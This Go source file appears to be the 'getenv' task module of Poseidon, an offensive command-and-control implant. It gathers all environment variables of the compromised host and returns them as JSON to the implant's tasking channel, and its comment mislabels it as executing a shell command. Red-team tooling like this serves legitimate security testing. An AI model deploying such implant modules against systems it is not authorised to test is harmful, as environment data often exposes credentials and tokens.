package getenv

import (
	"encoding/json"
	"os"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.TaskItem = task
	tMsg.Error = false
	environOutput := map[string]interface{}{
		"env": os.Environ(),
	}

	output, err := json.MarshalIndent(environOutput, "", "	")
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}
	tMsg.TaskResult = output
	threadChannel <- tMsg
}
